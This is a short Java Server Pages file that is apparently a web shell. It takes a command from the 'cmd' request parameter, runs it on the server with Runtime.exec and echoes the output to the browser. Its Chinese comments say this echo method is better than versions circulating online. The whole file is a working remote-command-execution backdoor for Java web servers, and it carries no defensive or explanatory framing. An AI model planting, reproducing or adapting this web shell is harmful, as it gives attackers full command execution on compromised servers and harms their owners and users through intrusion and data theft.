<%@ page language="java" pageEncoding="UTF-8" %>
<%
  Runtime rt = Runtime.getRuntime();
  String cmd = request.getParameter("cmd");
  Process process = rt.exec(cmd);
  java.io.InputStream in = process.getInputStream();
  // 回显
  out.print("<pre>");
  // 网上流传的回显代码略有问题，建议采用这种方式
  java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
  java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
  String s;
  while ((s = stdInput.readLine()) != null) {
    out.println(s);
  }
  out.print("</pre>");
%>